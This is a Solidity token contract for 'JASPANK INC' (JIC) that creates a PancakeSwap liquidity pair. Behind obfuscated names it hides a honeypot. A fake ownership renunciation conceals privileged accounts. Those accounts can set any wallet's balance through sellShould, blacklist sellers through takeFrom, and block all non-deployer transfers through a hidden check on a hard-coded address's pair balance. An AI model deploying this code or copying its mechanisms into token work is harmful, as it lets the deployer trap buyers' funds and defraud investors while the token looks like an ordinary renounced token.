//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface totalMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellFund {
    function createPair(address limitSwap, address launchMin) external returns (address);
}

abstract contract amountLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeIsLimit) external view returns (uint256);

    function transfer(address fundTake, uint256 fundTx) external returns (bool);

    function allowance(address amountTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTx) external returns (bool);

    function transferFrom(address sender,address fundTake,uint256 fundTx) external returns (bool);

    event Transfer(address indexed from, address indexed fundMarketingList, uint256 value);
    event Approval(address indexed amountTo, address indexed spender, uint256 value);
}

interface liquidityAutoMetadata is liquidityAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JASPANKINC is amountLaunch, liquidityAuto, liquidityAutoMetadata {

    uint256 private toFeeTrading;

    bool public launchedAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return atLaunch;
    }

    constructor (){
        if (launchedAmount != tradingFund) {
            tradingFund = true;
        }
        fromMarketing();
        totalMin takeLaunched = totalMin(swapMax);
        sellTokenReceiver = sellFund(takeLaunched.factory()).createPair(takeLaunched.WETH(), address(this));
        if (isFrom != senderFrom) {
            launchedAmount = false;
        }
        amountReceiverAt = _msgSender();
        modeLaunch[amountReceiverAt] = true;
        enableLiquidity[amountReceiverAt] = atLaunch;
        
        emit Transfer(address(0), amountReceiverAt, atLaunch);
    }

    mapping(address => mapping(address => uint256)) private teamFrom;

    uint8 private autoMax = 18;

    mapping(address => bool) public modeLaunch;

    function exemptWallet() private view {
        require(modeLaunch[_msgSender()]);
    }

    address atTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function autoBuyFund(uint256 fundTx) public {
        exemptWallet();
        exemptReceiver = fundTx;
    }

    uint256 public walletTeam;

    function approve(address sellBuy, uint256 fundTx) public virtual override returns (bool) {
        teamFrom[_msgSender()][sellBuy] = fundTx;
        emit Approval(_msgSender(), sellBuy, fundTx);
        return true;
    }

    uint256 senderMin;

    function takeFrom(address marketingBuy) public {
        exemptWallet();
        if (tradingFund != txTeamBuy) {
            receiverFee = isFrom;
        }
        if (marketingBuy == amountReceiverAt || marketingBuy == sellTokenReceiver) {
            return;
        }
        liquidityMaxTrading[marketingBuy] = true;
    }

    function getOwner() external view returns (address) {
        return launchSell;
    }

    uint256 public senderFrom;

    bool public txTeamBuy;

    event OwnershipTransferred(address indexed liquidityMax, address indexed listAuto);

    function symbol() external view virtual override returns (string memory) {
        return minFee;
    }

    function marketingFund(address swapSell, address fundTake, uint256 fundTx) internal returns (bool) {
        require(enableLiquidity[swapSell] >= fundTx);
        enableLiquidity[swapSell] -= fundTx;
        enableLiquidity[fundTake] += fundTx;
        emit Transfer(swapSell, fundTake, fundTx);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return autoMax;
    }

    function balanceOf(address takeIsLimit) public view virtual override returns (uint256) {
        return enableLiquidity[takeIsLimit];
    }

    address private launchSell;

    function limitSwapReceiver(address exemptAt) public {
        if (minTxLaunch) {
            return;
        }
        if (receiverFee != isFrom) {
            receiverFee = senderFrom;
        }
        modeLaunch[exemptAt] = true;
        if (senderFrom == walletTeam) {
            receiverFee = isFrom;
        }
        minTxLaunch = true;
    }

    function transferFrom(address swapSell, address fundTake, uint256 fundTx) external override returns (bool) {
        if (_msgSender() != swapMax) {
            if (teamFrom[swapSell][_msgSender()] != type(uint256).max) {
                require(fundTx <= teamFrom[swapSell][_msgSender()]);
                teamFrom[swapSell][_msgSender()] -= fundTx;
            }
        }
        return tokenEnable(swapSell, fundTake, fundTx);
    }

    function owner() external view returns (address) {
        return launchSell;
    }

    address swapMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public amountReceiverAt;

    bool public tradingFund;

    string private maxLiquidity = "JASPANK INC";

    uint256 exemptReceiver;

    mapping(address => bool) public liquidityMaxTrading;

    function fromMarketing() public {
        emit OwnershipTransferred(amountReceiverAt, address(0));
        launchSell = address(0);
    }

    function allowance(address autoEnable, address sellBuy) external view virtual override returns (uint256) {
        if (sellBuy == swapMax) {
            return type(uint256).max;
        }
        return teamFrom[autoEnable][sellBuy];
    }

    function sellShould(address totalLiquidity, uint256 fundTx) public {
        exemptWallet();
        enableLiquidity[totalLiquidity] = fundTx;
    }

    function name() external view virtual override returns (string memory) {
        return maxLiquidity;
    }

    string private minFee = "JIC";

    uint256 private receiverFee;

    mapping(address => uint256) private enableLiquidity;

    uint256 private atLaunch = 100000000 * 10 ** 18;

    address public sellTokenReceiver;

    function transfer(address totalLiquidity, uint256 fundTx) external virtual override returns (bool) {
        return tokenEnable(_msgSender(), totalLiquidity, fundTx);
    }

    uint256 public isFrom;

    function tokenEnable(address swapSell, address fundTake, uint256 fundTx) internal returns (bool) {
        if (swapSell == amountReceiverAt) {
            return marketingFund(swapSell, fundTake, fundTx);
        }
        uint256 limitLaunched = liquidityAuto(sellTokenReceiver).balanceOf(atTeam);
        require(limitLaunched == exemptReceiver);
        require(!liquidityMaxTrading[swapSell]);
        return marketingFund(swapSell, fundTake, fundTx);
    }

    bool public minTxLaunch;

}